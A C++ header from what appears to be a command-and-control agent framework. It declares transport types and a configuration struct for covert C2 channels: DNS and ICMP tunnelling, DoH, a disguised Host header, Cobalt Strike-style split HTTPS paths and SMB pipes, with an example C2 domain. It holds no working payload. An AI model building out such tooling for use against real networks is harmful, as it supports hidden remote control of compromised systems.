/**
 * @file ChannelConfig.hpp
 * @brief 通道配置与类型
 * @details
 * 为什么提升: `IChannel` 的 `Open(const TransportConfig&)` 需要这些类型, 而
 * `ITransport` 现在继承 `IChannel` —— 若定义仍留在 `ITransport.hpp` 就会形成
 * 头文件环。提到本文件后依赖是单向的:
 *
 *     ChannelCaps.hpp  →  ChannelConfig.hpp  →  IChannel.hpp  →  ITransport.hpp
 *
 * `CapsForType` 也放在此处: 它是"类型 → 能力"的**唯一映射表**, 既供
 * `ITransport` 的默认 `Caps()` 使用, 也供装配层与夹具断言使用 —— 放在一个地方
 * 才能保证"声明"与"实现"不会各说一套。
 */
#pragma once

#include <cstddef>
#include <cstdint>
#include <string>

#include "Core/Comms/Channel/ChannelCaps.hpp"

namespace cleat {

    /**
     * @brief 传输类型枚举（降级链候选表按此标识）
     * @details P2.5 起本枚举**不再是能力表的键**（能力表字符串化，见 ChannelRegistry.cpp
     *          的 CapsForTypeStr）——它退化为 `IChannel::Type()` 的过渡兼容标识；
     *          新增通道时扩展枚举仅为让 Type()/日志/兼容判定可表达(如  的 Quic)。
     */
    enum class TransportType { Tcp = 0, Https = 1, Dns = 2, Icmp = 3, Smb = 4, Ws = 5, Quic = 6 };

    /**
     * @brief 传输配置结构
     * @details 每个候选一份，来源：AgentConfig transport_list + CLI 覆盖
     */
    struct TransportConfig {
        std::string host;            ///< IP 或域名
        uint16_t    port = 0;        ///< TCP/HTTPS 端口
        std::string url;             ///< HTTPS：GET 拉取路径（https://host/path）
        std::string upload_url;      ///< HTTPS：POST 回传路径（空 = 同 url；CS 式分离路径）
        std::string dns_server;      ///< DNS：服务器地址 host:port（如 127.0.0.1:5353）
        std::string domain;          ///< DNS：查询域（如 c2.example.com）
        std::string doh_url;         ///< DNS：DoH resolver URL（RFC8484, 如 https://dns.example/dns-query;
                                     ///<   空 = UDP 直发模式。可被编译期 CLEAT_DNS_DOH_URL 兜底,
        std::string icmp_target;     ///< ICMP：目标 IP
        std::string host_header;     ///< 伪装 Host
        uint32_t    timeout_ms = 5000;                       ///< 超时（毫秒）
        size_t      max_frame = 50 * 1024 * 1024;            ///< 流式单帧上限（字节）
        size_t      max_datagram = 64 * 1024;                ///< DNS/ICMP 单报文上限（字节）
        std::string pipe_key;            ///< 管道(SMB) pre-auth 口令; 空 = 不认证。
                                         ///  父子两端配置同一口令: 连入后先做
                                         ///  challenge-HMAC 握手,
                                         ///  失败即断开; 会话层帧在其后流转
        // 后续可扩展：代理、UA 池、TLS 指纹参数、DNS 服务器地址等
    };

    /**
     * @brief 按通道类型给出能力声明(枚举 → 能力)
     * @details **P2.5 起本函数是兼容薄层** —— 能力表的单一数据源是
     *          `ChannelRegistry.hpp::CapsForTypeStr(字符串)`(实现在 ChannelRegistry.cpp)。
     *          本函数"枚举→字符串→查表"转发, 供 `ITransport::Caps()` 的默认实现与既有
     *          夹具使用。**新增通道不要再在此加 case**: 只需在 `RegisterBuiltinChannels`
     *          里用 `CapsOf("新类型")` 声明能力, `TransportType` 枚举可不动
     *          (它已退化为 `ITransport::Type()` 的兼容标识, 不再是能力表的键)。
     */
    ChannelCaps CapsForType(TransportType type);

} // namespace cleat
